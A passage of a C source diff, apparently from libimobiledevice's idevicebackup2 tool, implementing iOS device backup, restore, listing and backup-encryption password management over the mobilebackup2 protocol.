+    if (err != MOBILEBACKUP2_E_SUCCESS) {
+        printf("Could not send status response, error %d\n", err);
+    }
+}
+
+static void mb2_handle_make_directory(mobilebackup2_client_t mobilebackup2,
+                                      plist_t message, const char *backup_dir)
+{
+    if (!message || (plist_get_node_type(message) != PLIST_ARRAY)
+        || plist_array_get_size(message) < 2 || !backup_dir)
+        return;
+
+    plist_t dir = plist_array_get_item(message, 1);
+    char *str = NULL;
+    int errcode = 0;
+    char *errdesc = NULL;
+    plist_get_string_val(dir, &str);
+
+    char *newpath = build_path(backup_dir, str, NULL);
+    free(str);
+
+    if (mkdir_with_parents(newpath, 0755) < 0) {
+        errdesc = strerror(errno);
+        if (errno != EEXIST) {
+            printf("mkdir: %s (%d)\n", errdesc, errno);
+        }
+        errcode = errno_to_device_error(errno);
+    }
+    free(newpath);
+    mobilebackup2_error_t err =
+        mobilebackup2_send_status_response(mobilebackup2, errcode, errdesc,
+                                           NULL);
+    if (err != MOBILEBACKUP2_E_SUCCESS) {
+        printf("Could not send status response, error %d\n", err);
+    }
+}
+
+static void mb2_copy_file_by_path(const char *src, const char *dst)
+{
+    FILE *from, *to;
+    char buf[BUFSIZ];
+    size_t length;
+
+    /* open source file */
+    if ((from = fopen(src, "rb")) == NULL) {
+        printf("Cannot open source path '%s'.\n", src);
+        return;
+    }
+
+    /* open destination file */
+    if ((to = fopen(dst, "wb")) == NULL) {
+        printf("Cannot open destination file '%s'.\n", dst);
+        return;
+    }
+
+    /* copy the file */
+    while ((length = fread(buf, 1, BUFSIZ, from)) != 0) {
+        fwrite(buf, 1, length, to);
+    }
+
+    if (fclose(from) == EOF) {
+        printf("Error closing source file.\n");
+    }
+
+    if (fclose(to) == EOF) {
+        printf("Error closing destination file.\n");
+    }
+}
+
+static void mb2_copy_directory_by_path(const char *src, const char *dst)
+{
+    if (!src || !dst) {
+        return;
+    }
+
+    struct stat st;
+
+    /* if src does not exist */
+    if ((stat(src, &st) < 0) || !S_ISDIR(st.st_mode)) {
+        printf("ERROR: Source directory does not exist '%s': %s (%d)\n", src,
+               strerror(errno), errno);
+        return;
+    }
+
+    /* if dst directory does not exist */
+    if ((stat(dst, &st) < 0) || !S_ISDIR(st.st_mode)) {
+        /* create it */
+        if (mkdir_with_parents(dst, 0755) < 0) {
+            printf
+                ("ERROR: Unable to create destination directory '%s': %s (%d)\n",
+                 dst, strerror(errno), errno);
+            return;
+        }
+    }
+
+    /* loop over src directory contents */
+    DIR *cur_dir = opendir(src);
+    if (cur_dir) {
+        struct dirent *ep;
+        while ((ep = readdir(cur_dir))) {
+            if ((strcmp(ep->d_name, ".") == 0)
+                || (strcmp(ep->d_name, "..") == 0)) {
+                continue;
+            }
+            char *srcpath = build_path(src, ep->d_name, NULL);
+            char *dstpath = build_path(dst, ep->d_name, NULL);
+            if (srcpath && dstpath) {
+                /* copy file */
+                mb2_copy_file_by_path(srcpath, dstpath);
+
+                free(srcpath);
+                free(dstpath);
+            }
+        }
+        closedir(cur_dir);
+    }
+}
+
+#ifdef WIN32
+#define BS_CC '\b'
+#define my_getch getch
+#else
+#define BS_CC 0x7f
+static int my_getch()
+{
+    struct termios oldt, newt;
+    int ch;
+    tcgetattr(STDIN_FILENO, &oldt);
+    newt = oldt;
+    newt.c_lflag &= ~(ICANON | ECHO);
+    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+    ch = getchar();
+    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+    return ch;
+}
+#endif
+
+static void get_hidden_input(char *buf, int maxlen)
+{
+    int pwlen = 0;
+    int c;
+
+    while ((c = my_getch())) {
+        if ((c == '\r') || (c == '\n')) {
+            break;
+        } else if (isprint(c)) {
+            if (pwlen < maxlen - 1)
+                buf[pwlen++] = c;
+            fputc('*', stderr);
+        } else if (c == BS_CC) {
+            if (pwlen > 0) {
+                fputs("\b \b", stderr);
+                pwlen--;
+            }
+        }
+    }
+    buf[pwlen] = 0;
+}
+
+static char *ask_for_password(const char *msg, int type_again)
+{
+    char pwbuf[256];
+
+    fprintf(stderr, "%s: ", msg);
+    fflush(stderr);
+    get_hidden_input(pwbuf, 256);
+    fputc('\n', stderr);
+
+    if (type_again) {
+        char pwrep[256];
+
+        fprintf(stderr, "%s (repeat): ", msg);
+        fflush(stderr);
+        get_hidden_input(pwrep, 256);
+        fputc('\n', stderr);
+
+        if (strcmp(pwbuf, pwrep) != 0) {
+            printf("ERROR: passwords don't match\n");
+            return NULL;
+        }
+    }
+    return strdup(pwbuf);
+}
+
+/**
+ * signal handler function for cleaning up properly
+ */
+static void clean_exit(int sig)
+{
+    fprintf(stderr, "Exiting...\n");
+    quit_flag++;
+}
+
+static void print_usage(int argc, char **argv)
+{
+    char *name = NULL;
+    name = strrchr(argv[0], '/');
+    printf("Usage: %s [OPTIONS] CMD [CMDOPTIONS] DIRECTORY\n",
+           (name ? name + 1 : argv[0]));
+    printf
+        ("Create or restore backup from the current or specified directory.\n\n");
+    printf("commands:\n");
+    printf("  backup\tcreate backup for the device\n");
+    printf("  restore\trestore last backup to the device\n");
+    printf("    --system\t\trestore system files, too.\n");
+    printf("    --reboot\t\treboot the system when done.\n");
+    printf("    --copy\t\tcreate a copy of backup folder before restoring.\n");
+    printf("    --settings\t\trestore device settings from the backup.\n");
+    printf("    --remove\t\tremove items which are not being restored\n");
+    printf("    --password PWD\tsupply the password of the source backup\n");
+    printf("  info\t\tshow details about last completed backup of device\n");
+    printf("  list\t\tlist files of last completed backup in CSV format\n");
+    printf("  unback\tunpack a completed backup in DIRECTORY/_unback_/\n");
+    printf("  encryption on|off [PWD]\tenable or disable backup encryption\n");
+    printf
+        ("    NOTE: password will be requested in interactive mode if omitted\n");
+    printf("  changepw [OLD NEW]  change backup password on target device\n");
+    printf
+        ("    NOTE: passwords will be requested in interactive mode if omitted\n");
+    printf("\n");
+    printf("options:\n");
+    printf("  -d, --debug\t\tenable communication debugging\n");
+    printf
+        ("  -u, --udid UDID\ttarget specific device by its 40-digit device UDID\n");
+    printf
+        ("  -s, --source UDID\tuse backup data from device specified by UDID\n");
+    printf("  -i, --interactive\trequest passwords interactively\n");
+    printf("  -h, --help\t\tprints usage information\n");
+    printf("\n");
+}
+
+int idevicebackup2(int argc, char *argv[])
+{
+    idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
+    int i;
+    char *udid = NULL;
+    char *source_udid = NULL;
+    lockdownd_service_descriptor_t service = NULL;
+    int cmd = -1;
+    int cmd_flags = 0;
+    int is_full_backup = 0;
+    int result_code = -1;
+    char *backup_directory = NULL;
+    int interactive_mode = 0;
+    char *backup_password = NULL;
+    char *newpw = NULL;
+    struct stat st;
+    plist_t node_tmp = NULL;
+    plist_t info_plist = NULL;
+    plist_t opts = NULL;
+    mobilebackup2_error_t err;
+
+    /* we need to exit cleanly on running backups and restores or we cause havok */
+    signal(SIGINT, clean_exit);
+    signal(SIGTERM, clean_exit);
+#ifndef WIN32
+    signal(SIGQUIT, clean_exit);
+    signal(SIGPIPE, SIG_IGN);
+#endif
+
+    /* parse cmdline args */
+    for (i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "-d") || !strcmp(argv[i], "--debug")) {
+            idevice_set_debug_level(1);
+            continue;
+        } else if (!strcmp(argv[i], "-u") || !strcmp(argv[i], "--udid")) {
+            i++;
+            if (!argv[i] || (strlen(argv[i]) != 40)) {
+                print_usage(argc, argv);
+                return -1;
+            }
+            udid = strdup(argv[i]);
+            continue;
+        } else if (!strcmp(argv[i], "-s") || !strcmp(argv[i], "--source")) {
+            i++;
+            if (!argv[i] || (strlen(argv[i]) != 40)) {
+                print_usage(argc, argv);
+                return -1;
+            }
+            source_udid = strdup(argv[i]);
+            continue;
+        } else if (!strcmp(argv[i], "-i") || !strcmp(argv[i], "--interactive")) {
+            interactive_mode = 1;
+            continue;
+        } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
+            print_usage(argc, argv);
+            return 0;
+        } else if (!strcmp(argv[i], "backup")) {
+            cmd = CMD_BACKUP;
+        } else if (!strcmp(argv[i], "restore")) {
+            cmd = CMD_RESTORE;
+        } else if (!strcmp(argv[i], "--system")) {
+            cmd_flags |= CMD_FLAG_RESTORE_SYSTEM_FILES;
+        } else if (!strcmp(argv[i], "--reboot")) {
+            cmd_flags |= CMD_FLAG_RESTORE_REBOOT;
+        } else if (!strcmp(argv[i], "--copy")) {
+            cmd_flags |= CMD_FLAG_RESTORE_COPY_BACKUP;
+        } else if (!strcmp(argv[i], "--settings")) {
+            cmd_flags |= CMD_FLAG_RESTORE_SETTINGS;
+        } else if (!strcmp(argv[i], "--remove")) {
+            cmd_flags |= CMD_FLAG_RESTORE_REMOVE_ITEMS;
+        } else if (!strcmp(argv[i], "--password")) {
+            i++;
+            if (!argv[i]) {
+                print_usage(argc, argv);
+                return -1;
+            }
+            if (backup_password)
+                free(backup_password);
+            backup_password = strdup(argv[i]);
+            continue;
+        } else if (!strcmp(argv[i], "info")) {
+            cmd = CMD_INFO;
+            verbose = 0;
+        } else if (!strcmp(argv[i], "list")) {
+            cmd = CMD_LIST;
+            verbose = 0;
+        } else if (!strcmp(argv[i], "unback")) {
+            cmd = CMD_UNBACK;
+        } else if (!strcmp(argv[i], "encryption")) {
+            cmd = CMD_CHANGEPW;
+            i++;
+            if (!argv[i]) {
+                printf
+                    ("No argument given for encryption command; requires either 'on' or 'off'.\n");
+                print_usage(argc, argv);
+                return -1;
+            }
+            if (!strcmp(argv[i], "on")) {
+                cmd_flags |= CMD_FLAG_ENCRYPTION_ENABLE;
+            } else if (!strcmp(argv[i], "off")) {
+                cmd_flags |= CMD_FLAG_ENCRYPTION_DISABLE;
+            } else {
+                printf
+                    ("Invalid argument '%s' for encryption command; must be either 'on' or 'off'.\n",
+                     argv[i]);
+            }
+            // check if a password was given on the command line
+            if (newpw) {
+                free(newpw);
+                newpw = NULL;
+            }
+            if (backup_password) {
+                free(backup_password);
+                backup_password = NULL;
+            }
+            i++;
+            if (argv[i]) {
+                if (cmd_flags & CMD_FLAG_ENCRYPTION_ENABLE) {
+                    newpw = strdup(argv[i]);
+                } else if (cmd_flags & CMD_FLAG_ENCRYPTION_DISABLE) {
+                    backup_password = strdup(argv[i]);
+                }
+            }
+            continue;
+        } else if (!strcmp(argv[i], "changepw")) {
+            cmd = CMD_CHANGEPW;
+            cmd_flags |= CMD_FLAG_ENCRYPTION_CHANGEPW;
+            // check if passwords were given on command line
+            if (newpw) {
+                free(newpw);
+                newpw = NULL;
+            }
+            if (backup_password) {
+                free(backup_password);
+                backup_password = NULL;
+            }
+            i++;
+            if (argv[i]) {
+                backup_password = strdup(argv[i]);
+                i++;
+                if (!argv[i]) {
+                    printf
+                        ("Old and new passwords have to be passed as arguments for the changepw command\n");
+                    print_usage(argc, argv);
+                    return -1;
+                }
+                newpw = strdup(argv[i]);
+            }
+            continue;
+        } else if (backup_directory == NULL) {
+            backup_directory = argv[i];
+        } else {
+            print_usage(argc, argv);
+            return -1;
+        }
+    }
+
+    /* verify options */
+    if (cmd == -1) {
+        printf("No command specified.\n");
+        print_usage(argc, argv);
+        return -1;
+    }
+
+    if (cmd == CMD_CHANGEPW) {
+        backup_directory = strdup(".this_folder_is_not_present_on_purpose");
+    } else {
+        if (backup_directory == NULL) {
+            printf("No target backup directory specified.\n");
+            print_usage(argc, argv);
+            return -1;
+        }
+
+        /* verify if passed backup directory exists */
+        if (stat(backup_directory, &st) != 0) {
+            printf("ERROR: Backup directory \"%s\" does not exist!\n",
+                   backup_directory);
+            return -1;
+        }
+    }
+
+    idevice_t device = NULL;
+    if (udid) {
+        ret = idevice_new(&device, udid);
+        if (ret != IDEVICE_E_SUCCESS) {
+            printf("No device found with udid %s, is it plugged in?\n", udid);
+            return -1;
+        }
+    } else {
+        ret = idevice_new(&device, NULL);
+        if (ret != IDEVICE_E_SUCCESS) {
+            printf("No device found, is it plugged in?\n");
+            return -1;
+        }
+        idevice_get_udid(device, &udid);
+    }
+
+    if (!source_udid) {
+        source_udid = strdup(udid);
+    }
+
+    uint8_t is_encrypted = 0;
+    char *info_path = NULL;
+    if (cmd == CMD_CHANGEPW) {
+        if (!interactive_mode && (!backup_password || !newpw)) {
+            printf
+                ("ERROR: Can't get password input in non-interactive mode. Either pass password(s) on the command line, or enable interactive mode with -i or --interactive.\n");
+            return -1;
+        }
+    } else {
+        /* backup directory must contain an Info.plist */
+        info_path =
+            build_path(backup_directory, source_udid, "Info.plist", NULL);
+        if (cmd == CMD_RESTORE) {
+            if (stat(info_path, &st) != 0) {
+                free(info_path);
+                printf
+                    ("ERROR: Backup directory \"%s\" is invalid. No Info.plist found for UDID %s.\n",
+                     backup_directory, source_udid);
+                return -1;
+            }
+            char *manifest_path =
+                build_path(backup_directory, source_udid, "Manifest.plist",
+                           NULL);
+            if (stat(manifest_path, &st) != 0) {
+                free(info_path);
+            }
+            plist_t manifest_plist = NULL;
+            plist_read_from_filename(&manifest_plist, manifest_path);
+            if (!manifest_plist) {
+                free(info_path);
+                free(manifest_path);
+                printf
+                    ("ERROR: Backup directory \"%s\" is invalid. No Manifest.plist found for UDID %s.\n",
+                     backup_directory, source_udid);
+                return -1;
+            }
+            node_tmp = plist_dict_get_item(manifest_plist, "IsEncrypted");
+            if (node_tmp && (plist_get_node_type(node_tmp) == PLIST_BOOLEAN)) {
+                plist_get_bool_val(node_tmp, &is_encrypted);
+            }
+            plist_free(manifest_plist);
+            free(manifest_path);
+        }
+        PRINT_VERBOSE(1, "Backup directory is \"%s\"\n", backup_directory);
+    }
+
+    if (is_encrypted) {
+        PRINT_VERBOSE(1, "This is an encrypted backup.\n");
+        if (backup_password == NULL) {
+            if (interactive_mode) {
+                backup_password = ask_for_password("Enter backup password", 0);
+            }
+            if (!backup_password || (strlen(backup_password) == 0)) {
+                if (backup_password) {
+                    free(backup_password);
+                }
+                idevice_free(device);
+                printf
+                    ("ERROR: a backup password is required to restore an encrypted backup. Cannot continue.\n");
+                return -1;
+            }
+        }
+    }
+
+    lockdownd_client_t lockdown = NULL;
+    if (LOCKDOWN_E_SUCCESS !=
+        lockdownd_client_new_with_handshake(device, &lockdown,
+                                            "idevicebackup")) {
+        idevice_free(device);
+        return -1;
+    }
+
+    /* start notification_proxy */
+    np_client_t np = NULL;
+    ret = lockdownd_start_service(lockdown, NP_SERVICE_NAME, &service);
+    if ((ret == LOCKDOWN_E_SUCCESS) && service && service->port) {
+        np_client_new(device, service, &np);
+        np_set_notify_callback(np, notify_cb, NULL);
+        const char *noties[5] = {
+            NP_SYNC_CANCEL_REQUEST,
+            NP_SYNC_SUSPEND_REQUEST,
+            NP_SYNC_RESUME_REQUEST,
+            NP_BACKUP_DOMAIN_CHANGED,
+            NULL
+        };
+        np_observe_notifications(np, noties);
+    } else {
+        printf("ERROR: Could not start service %s.\n", NP_SERVICE_NAME);
+    }
+
+    afc_client_t afc = NULL;
+    if (cmd == CMD_BACKUP) {
+        /* start AFC, we need this for the lock file */
+        service->port = 0;
+        service->ssl_enabled = 0;
+        ret = lockdownd_start_service(lockdown, "com.apple.afc", &service);
+        if ((ret == LOCKDOWN_E_SUCCESS) && service->port) {
+            afc_client_new(device, service, &afc);
+        }
+    }
+
+    if (service) {
+        lockdownd_service_descriptor_free(service);
+        service = NULL;
+    }
+
+    /* start mobilebackup service and retrieve port */
+    mobilebackup2_client_t mobilebackup2 = NULL;
+    ret =
+        lockdownd_start_service(lockdown, MOBILEBACKUP2_SERVICE_NAME, &service);
+    if ((ret == LOCKDOWN_E_SUCCESS) && service && service->port) {
+        PRINT_VERBOSE(1, "Started \"%s\" service on port %d.\n",
+                      MOBILEBACKUP2_SERVICE_NAME, service->port);
+        mobilebackup2_client_new(device, service, &mobilebackup2);
+
+        if (service) {
+            lockdownd_service_descriptor_free(service);
+            service = NULL;
+        }
+
+        /* send Hello message */
+        double local_versions[2] = { 2.0, 2.1 };
+        double remote_version = 0.0;
+        err =
+            mobilebackup2_version_exchange(mobilebackup2, local_versions, 2,
+                                           &remote_version);
+        if (err != MOBILEBACKUP2_E_SUCCESS) {
+            printf
+                ("Could not perform backup protocol version exchange, error code %d\n",
+                 err);
+            cmd = CMD_LEAVE;
+            goto checkpoint;
+        }
+
+        PRINT_VERBOSE(1, "Negotiated Protocol Version %.1f\n", remote_version);
+
+        /* check abort conditions */
+        if (quit_flag > 0) {
+            PRINT_VERBOSE(1, "Aborting as requested by user...\n");
+            cmd = CMD_LEAVE;
+            goto checkpoint;
+        }
+
+        /* verify existing Info.plist */
+        if (info_path && (stat(info_path, &st) == 0)) {
+            PRINT_VERBOSE(1, "Reading Info.plist from backup.\n");
+            plist_read_from_filename(&info_plist, info_path);
+
+            if (!info_plist) {
+                printf("Could not read Info.plist\n");
+                is_full_backup = 1;
+            }
+        } else {
+            if (cmd == CMD_RESTORE) {
+                printf("Aborting restore. Info.plist is missing.\n");
+                cmd = CMD_LEAVE;
+            } else {
+                is_full_backup = 1;
+            }
+        }
+
+        uint64_t lockfile = 0;
+        if (cmd == CMD_BACKUP) {
+            do_post_notification(device, NP_SYNC_WILL_START);
+            afc_file_open(afc, "/com.apple.itunes.lock_sync", AFC_FOPEN_RW,
+                          &lockfile);
+        }
+        if (lockfile) {
+            afc_error_t aerr;
+            do_post_notification(device, NP_SYNC_LOCK_REQUEST);
+            for (i = 0; i < LOCK_ATTEMPTS; i++) {
+                aerr = afc_file_lock(afc, lockfile, AFC_LOCK_EX);
+                if (aerr == AFC_E_SUCCESS) {
+                    do_post_notification(device, NP_SYNC_DID_START);
+                    break;
+                } else if (aerr == AFC_E_OP_WOULD_BLOCK) {
+                    usleep(LOCK_WAIT);
+                    continue;
+                } else {
+                    fprintf(stderr,
+                            "ERROR: could not lock file! error code: %d\n",
+                            aerr);
+                    afc_file_close(afc, lockfile);
+                    lockfile = 0;
+                    cmd = CMD_LEAVE;
+                }
+            }
+            if (i == LOCK_ATTEMPTS) {
+                fprintf(stderr, "ERROR: timeout while locking for sync\n");
+                afc_file_close(afc, lockfile);
+                lockfile = 0;
+                cmd = CMD_LEAVE;
+            }
+        }
+        uint8_t willEncrypt = 0;
+        node_tmp = NULL;
+        lockdownd_get_value(lockdown, "com.apple.mobile.backup", "WillEncrypt",
+                            &node_tmp);
+        if (node_tmp) {
+            if (plist_get_node_type(node_tmp) == PLIST_BOOLEAN) {
+                plist_get_bool_val(node_tmp, &willEncrypt);
+            }
+            plist_free(node_tmp);
+            node_tmp = NULL;
+        }
+
+ checkpoint:
+
+        switch (cmd) {
+        case CMD_BACKUP:
+            PRINT_VERBOSE(1, "Starting backup...\n");
+
+            /* make sure backup device sub-directory exists */
+            char *devbackupdir =
+                build_path(backup_directory, source_udid, NULL);
+            __mkdir(devbackupdir, 0755);
+            free(devbackupdir);
+
+            if (strcmp(source_udid, udid) != 0) {
+                /* handle different source backup directory */
+                // make sure target backup device sub-directory exists
+                devbackupdir = build_path(backup_directory, udid, NULL);
+                __mkdir(devbackupdir, 0755);
+                free(devbackupdir);
+
+                // use Info.plist path in target backup folder */
+                free(info_path);
+                info_path =
+                    build_path(backup_directory, udid, "Info.plist", NULL);
+            }
+
+            /* TODO: check domain com.apple.mobile.backup key RequiresEncrypt and WillEncrypt with lockdown */
+            /* TODO: verify battery on AC enough battery remaining */
+
+            /* re-create Info.plist (Device infos, IC-Info.sidb, photos, app_ids, iTunesPrefs) */
+            if (info_plist) {
+                plist_free(info_plist);
+                info_plist = NULL;
+            }
+            info_plist =
+                mobilebackup_factory_info_plist_new(udid, lockdown, afc);
+            remove(info_path);
+            plist_write_to_filename(info_plist, info_path, PLIST_FORMAT_XML);
+            free(info_path);
+
+            plist_free(info_plist);
+            info_plist = NULL;
+
+            /* request backup from device with manifest from last backup */
+            if (willEncrypt) {
+                PRINT_VERBOSE(1, "Backup will be encrypted.\n");
+            } else {
+                PRINT_VERBOSE(1, "Backup will be unencrypted.\n");
+            }
+            PRINT_VERBOSE(1, "Requesting backup from device...\n");
+            err =
+                mobilebackup2_send_request(mobilebackup2, "Backup", udid,
+                                           source_udid, NULL);
+            if (err == MOBILEBACKUP2_E_SUCCESS) {
+                if (is_full_backup) {
+                    PRINT_VERBOSE(1, "Full backup mode.\n");
+                } else {
+                    PRINT_VERBOSE(1, "Incremental backup mode.\n");
+                }
+            } else {
+                if (err == MOBILEBACKUP2_E_BAD_VERSION) {
+                    printf
+                        ("ERROR: Could not start backup process: backup protocol version mismatch!\n");
+                } else if (err == MOBILEBACKUP2_E_REPLY_NOT_OK) {
+                    printf
+                        ("ERROR: Could not start backup process: device refused to start the backup process.\n");
+                } else {
+                    printf
+                        ("ERROR: Could not start backup process: unspecified error occured\n");
+                }
+                cmd = CMD_LEAVE;
+            }
+            break;
+        case CMD_RESTORE:
+            /* TODO: verify battery on AC enough battery remaining */
+
+            /* verify if Status.plist says we read from an successful backup */
+            if (!mb2_status_check_snapshot_state
+                (backup_directory, source_udid, "finished")) {
+                printf
+                    ("ERROR: Cannot ensure we restore from a successful backup. Aborting.\n");
+                cmd = CMD_LEAVE;
+                break;
+            }
+
+            PRINT_VERBOSE(1, "Starting Restore...\n");
+
+            opts = plist_new_dict();
+            plist_dict_insert_item(opts, "RestoreSystemFiles",
+                                   plist_new_bool(cmd_flags &
+                                                  CMD_FLAG_RESTORE_SYSTEM_FILES));
+            PRINT_VERBOSE(1, "Restoring system files: %s\n",
+                          (cmd_flags & CMD_FLAG_RESTORE_SYSTEM_FILES ? "Yes" :
+                           "No"));
+            if ((cmd_flags & CMD_FLAG_RESTORE_REBOOT) == 0)
+                plist_dict_insert_item(opts, "RestoreShouldReboot",
+                                       plist_new_bool(0));
+            PRINT_VERBOSE(1, "Rebooting after restore: %s\n",
+                          (cmd_flags & CMD_FLAG_RESTORE_REBOOT ? "Yes" : "No"));
+            if ((cmd_flags & CMD_FLAG_RESTORE_COPY_BACKUP) == 0)
+                plist_dict_insert_item(opts, "RestoreDontCopyBackup",
+                                       plist_new_bool(1));
+            PRINT_VERBOSE(1, "Don't copy backup: %s\n",
+                          ((cmd_flags & CMD_FLAG_RESTORE_COPY_BACKUP) ==
+                           0 ? "Yes" : "No"));
+            plist_dict_insert_item(opts, "RestorePreserveSettings",
+                                   plist_new_bool((cmd_flags &
+                                                   CMD_FLAG_RESTORE_SETTINGS) ==
+                                                  0));
+            PRINT_VERBOSE(1, "Preserve settings of device: %s\n",
+                          ((cmd_flags & CMD_FLAG_RESTORE_SETTINGS) ==
+                           0 ? "Yes" : "No"));
+            if (cmd_flags & CMD_FLAG_RESTORE_REMOVE_ITEMS)
+                plist_dict_insert_item(opts, "RemoveItemsNotRestored",
+                                       plist_new_bool(1));
+            PRINT_VERBOSE(1, "Remove items that are not restored: %s\n",
+                          ((cmd_flags & CMD_FLAG_RESTORE_REMOVE_ITEMS) ? "Yes" :
+                           "No"));
+            if (backup_password != NULL) {
+                plist_dict_insert_item(opts, "Password",
+                                       plist_new_string(backup_password));
+            }
+            PRINT_VERBOSE(1, "Backup password: %s\n",
+                          (backup_password == NULL ? "No" : "Yes"));
+
+            err =
+                mobilebackup2_send_request(mobilebackup2, "Restore", udid,
+                                           source_udid, opts);
+            plist_free(opts);
+            if (err != MOBILEBACKUP2_E_SUCCESS) {
+                if (err == MOBILEBACKUP2_E_BAD_VERSION) {
+                    printf
+                        ("ERROR: Could not start restore process: backup protocol version mismatch!\n");
+                } else if (err == MOBILEBACKUP2_E_REPLY_NOT_OK) {
+                    printf
+                        ("ERROR: Could not start restore process: device refused to start the restore process.\n");
+                } else {
+                    printf
+                        ("ERROR: Could not start restore process: unspecified error occured\n");
+                }
+                cmd = CMD_LEAVE;
+            }
+            break;
+        case CMD_INFO:
+            PRINT_VERBOSE(1, "Requesting backup info from device...\n");
+            err =
+                mobilebackup2_send_request(mobilebackup2, "Info", udid,
+                                           source_udid, NULL);
+            if (err != MOBILEBACKUP2_E_SUCCESS) {
+                printf
+                    ("Error requesting backup info from device, error code %d\n",
+                     err);
+                cmd = CMD_LEAVE;
+            }
+            break;
+        case CMD_LIST:
+            PRINT_VERBOSE(1, "Requesting backup list from device...\n");
+            err =
+                mobilebackup2_send_request(mobilebackup2, "List", udid,
+                                           source_udid, NULL);
+            if (err != MOBILEBACKUP2_E_SUCCESS) {
+                printf
+                    ("Error requesting backup list from device, error code %d\n",
+                     err);
+                cmd = CMD_LEAVE;
+            }
+            break;
+        case CMD_UNBACK:
+            PRINT_VERBOSE(1, "Starting to unpack backup...\n");
+            err =
+                mobilebackup2_send_request(mobilebackup2, "Unback", udid,
+                                           source_udid, NULL);
+            if (err != MOBILEBACKUP2_E_SUCCESS) {
+                printf
+                    ("Error requesting unback operation from device, error code %d\n",
+                     err);
+                cmd = CMD_LEAVE;
+            }
+            break;
+        case CMD_CHANGEPW:
+            opts = plist_new_dict();
+            plist_dict_insert_item(opts, "TargetIdentifier",
+                                   plist_new_string(udid));
+            if (cmd_flags & CMD_FLAG_ENCRYPTION_ENABLE) {
+                if (!willEncrypt) {
+                    if (!newpw) {
+                        newpw =
+                            ask_for_password("Enter new backup password", 1);
+                    }
+                    if (!newpw) {
+                        printf("No backup password given. Aborting.\n");
+                    }
+                } else {
+                    printf
+                        ("ERROR: Backup encryption is already enabled. Aborting.\n");
+                    cmd = CMD_LEAVE;
+                    if (newpw) {
+                        free(newpw);
+                        newpw = NULL;
+                    }
+                }
+            } else if (cmd_flags & CMD_FLAG_ENCRYPTION_DISABLE) {
+                if (willEncrypt) {
+                    if (!backup_password) {
+                        backup_password =
+                            ask_for_password("Enter current backup password",
+                                             0);
+                    }
+                } else {
+                    printf
+                        ("ERROR: Backup encryption is not enabled. Aborting.\n");
+                    cmd = CMD_LEAVE;
+                    if (backup_password) {
+                        free(backup_password);
+                        backup_password = NULL;
+                    }
+                }
+            } else if (cmd_flags & CMD_FLAG_ENCRYPTION_CHANGEPW) {
+                if (willEncrypt) {
+                    if (!backup_password) {
+                        backup_password =
+                            ask_for_password("Enter old backup password", 0);
+                        newpw =
+                            ask_for_password("Enter new backup password", 1);
+                    }
+                } else {
+                    printf
+                        ("ERROR: Backup encryption is not enabled so can't change password. Aborting.\n");
+                    cmd = CMD_LEAVE;
+                    if (newpw) {
+                        free(newpw);
+                        newpw = NULL;
+                    }
+                    if (backup_password) {
+                        free(backup_password);
+                        backup_password = NULL;
+                    }
+                }
+            }
+            if (newpw) {
+                plist_dict_insert_item(opts, "NewPassword",
+                                       plist_new_string(newpw));
+            }
+            if (backup_password) {
+                plist_dict_insert_item(opts, "OldPassword",
+                                       plist_new_string(backup_password));
+            }
+            if (newpw || backup_password) {
+                mobilebackup2_send_message(mobilebackup2, "ChangePassword",
+                                           opts);
+                /*if (cmd_flags & CMD_FLAG_ENCRYPTION_ENABLE) {
+                   int retr = 10;
+                   while ((retr-- >= 0) && !backup_domain_changed) {
+                   sleep(1);
+                   }
+                   } */
+            } else {
+                cmd = CMD_LEAVE;
+            }
+            plist_free(opts);
+            break;
+        default:
+            break;
+        }
+
+        /* close down the lockdown connection as it is no longer needed */
+        if (lockdown) {
+            lockdownd_client_free(lockdown);
+            lockdown = NULL;
+        }
+
+        if (cmd != CMD_LEAVE) {
+            /* reset operation success status */
+            int operation_ok = 0;
+            plist_t message = NULL;
+
+            char *dlmsg = NULL;
+            int file_count = 0;
+            int errcode = 0;
+            const char *errdesc = NULL;
+
+            /* process series of DLMessage* operations */
+            do {
+                if (dlmsg) {
+                    free(dlmsg);
+                    dlmsg = NULL;
+                }
+                mobilebackup2_receive_message(mobilebackup2, &message, &dlmsg);
+                if (!message || !dlmsg) {
+                    PRINT_VERBOSE(1,
+                                  "Device is not ready yet. Going to try again in 2 seconds...\n");
+                    sleep(2);
+                    goto files_out;
+                }
+
+                if (!strcmp(dlmsg, "DLMessageDownloadFiles")) {
+                    /* device wants to download files from the computer */
+                    mb2_set_overall_progress_from_message(message, dlmsg);
+                    mb2_handle_send_files(mobilebackup2, message,
+                                          backup_directory);
+                } else if (!strcmp(dlmsg, "DLMessageUploadFiles")) {
+                    /* device wants to send files to the computer */
+                    mb2_set_overall_progress_from_message(message, dlmsg);
+                    file_count +=
+                        mb2_handle_receive_files(mobilebackup2, message,
+                                                 backup_directory);
+                } else if (!strcmp(dlmsg, "DLMessageGetFreeDiskSpace")) {
+                    /* device wants to know how much disk space is available on the computer */
+                    uint64_t freespace = 0;
+                    int res = -1;
+#ifdef WIN32
+                    if (GetDiskFreeSpaceEx
+                        (backup_directory, (PULARGE_INTEGER) & freespace, NULL,
+                         NULL)) {
+                        res = 0;
+                    }
+#else
+                    struct statvfs fs;
+                    memset(&fs, '\0', sizeof(fs));
+                    res = statvfs(backup_directory, &fs);
+                    if (res == 0) {
+                        freespace =
+                            (uint64_t) fs.f_bavail * (uint64_t) fs.f_bsize;
+                    }
+#endif
+                    plist_t freespace_item = plist_new_uint(freespace);
+                    mobilebackup2_send_status_response(mobilebackup2, res, NULL,
+                                                       freespace_item);
+                    plist_free(freespace_item);
+                } else if (!strcmp(dlmsg, "DLContentsOfDirectory")) {
+                    /* list directory contents */
+                    mb2_handle_list_directory(mobilebackup2, message,
+                                              backup_directory);
+                } else if (!strcmp(dlmsg, "DLMessageCreateDirectory")) {
+                    /* make a directory */
+                    mb2_handle_make_directory(mobilebackup2, message,
+                                              backup_directory);
+                } else if (!strcmp(dlmsg, "DLMessageMoveFiles")
+                           || !strcmp(dlmsg, "DLMessageMoveItems")) {
+                    /* perform a series of rename operations */
+                    mb2_set_overall_progress_from_message(message, dlmsg);
+                    plist_t moves = plist_array_get_item(message, 1);
+                    uint32_t cnt = plist_dict_get_size(moves);
+                    PRINT_VERBOSE(1, "Moving %d file%s\n", cnt,
+                                  (cnt == 1) ? "" : "s");
